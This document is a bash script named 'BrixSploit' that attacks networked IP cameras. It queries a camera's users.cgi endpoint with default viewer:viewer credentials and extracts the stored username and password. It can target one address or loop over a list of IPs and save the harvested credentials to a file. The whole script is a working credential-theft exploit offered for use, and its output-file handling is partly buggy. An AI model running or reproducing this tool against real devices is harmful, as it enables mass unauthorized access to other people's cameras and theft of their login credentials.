#! /bin/bash

echo "______      _                _       _ _   "
echo "| ___ \    (_)              | |     (_) |  "
echo "| |_/ /_ __ ___  _____ _ __ | | ___  _| |_ "
echo "| ___ \ '__| \ \/ / __| '_ \| |/ _ \| | __|"
echo "| |_/ / |  | |>  <\__ \ |_) | | (_) | | |_ "
echo "\____/|_|  |_/_/\_\___/ .__/|_|\___/|_|\__|"
echo "                      | |                  "
echo "                      |_|                  "
printf "\nMade by EMLGaming & M00SE\n"


if [ "$1" == "-h" ]; then
  echo "Usage: ./BrixSploit.sh [arguments] "
  printf " \nArguments:\n-o for output to file (example ./BrixSploit.sh -o test.txt\n-r for read ip adresses from list (example ./BrixSploit.sh -r ips.txt -o output.txt\n"
  exit 0
fi

if [ "$1" == "-o" ]; then
  printf "\nIPadress and port of camera: (ip:port) \n"
  read ip

  printf $ip"\n" > $2 2>&1
  curl -s --max-time 10 http://$ip/cgi-bin/users.cgi?action=getUsers -u viewer:viewer | grep -E '(User1.username|User1.password)' | grep -o -E '(userna.*|passwo.*)' >> $2 2>&1
  printf "\nDONE! Saved to $4!\n"
  exit 0
fi

if [ "$1" == "-r" ]; then
  let x=0
  lines="$(wc -l $2 | tr -dc '[:alnum:]\n\r' | sed 's/[^0-9]*//g')"
  while IFS='' read -r ip || [[ -n "$ip" ]]; do
    let x+=1
    echo "Working on IP $ip ($x/$lines)"
    printf $ip"\n" >> $4 2>&1

    curl -s --max-time 3 http://$ip/cgi-bin/users.cgi?action=getUsers -u viewer:viewer | grep -E '(User1.username|User1.password)' | grep -o -E '(userna.*|passwo.*)' >> $4 2>&1
    printf "\n" >> $4 2>&1
  done < "$2"
  printf "\nDONE! Saved to $4!\n"
  exit 0
fi

printf "\nType -h for more options \n\nIPadress and port of camera: (ip:port) \n"
read ip
curl -s --max-time 10 http://$ip/cgi-bin/users.cgi?action=getUsers -u viewer:viewer | grep -E '(User1.username|User1.password)' | grep -o -E '(userna.*|passwo.*)'
